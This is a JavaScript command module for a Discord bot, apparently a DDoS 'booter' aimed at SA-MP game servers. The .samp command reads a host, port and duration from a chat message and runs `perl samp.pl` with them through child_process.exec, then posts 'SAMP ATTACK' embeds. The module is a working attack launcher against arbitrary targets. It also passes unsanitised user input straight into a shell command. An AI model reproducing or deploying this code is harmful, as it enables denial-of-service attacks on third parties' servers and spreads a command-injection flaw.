const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const port = message.content.split (" ")[2]
const duration = message.content.split (" ")[3]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

// Example command
if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('SAMP')
	.setDescription("`example .samp 1.1.1.1 7777 60`")
	.setFooter("not all server samp down!")
	message.channel.send(embed1);
	return;
	}

// Command attack
var exec = require('child_process').exec
exec(`perl samp.pl ${host} ${port} ${duration}`, (error, stdout, stderr) => {
});

// Start Attacking
setTimeout(function(){ 
    console.log('Start Attacking ID Discord:' +  message.guild.id)

const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **SAMP ATTACK BY craxsrat** 🚀')
	.setTimestamp()
  .setDescription("**Host** : `" + host + "` \n **Port** : `" + port + "` \n **Methods** : `SAMP 💣` \n **Time** : `" + duration + "`")
	.setFooter('© Developer: ', client.user.avatarURL)
	.setTimestamp()
	.setImage(attackgif)
	.setThumbnail("")
 message.channel.send(embed);
 }, 5000); //time in milliseconds 1000 milliseconds = 1 seconds

// Attack Gif
var gifler = ["https://media.giphy.com/media/l4KhQo2MESJkc6QbS/giphy.gif", "https://media.giphy.com/media/jzHFPlw89eTqU/giphy.gif,"];
    var attackgif = gifler[Math.floor((Math.random() * gifler.length))];

// Verify Gif
var gify = ["https://media.giphy.com/media/6036p0cTnjUrNFpAlr/giphy.gif"];
		var loadinggif = gify[Math.floor((Math.random() * gify.length))];

// Start Verify
console.log('Start Verify ID Discord:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **SAMP** 🚀')
	.setTimestamp()
	.setDescription("**► Attack loading **")
	.setFooter('© Developer: ', client.user.avatarURL)
	.setTimestamp()
	.setImage(loadinggif)
	.setThumbnail("")
 message.channel.send(embed);
  }


exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['samp'],
  permLevel: 0
}

exports.help = {
  name: 'samp',
  description: 'VenThing#3280',
  usage: 'samp'
}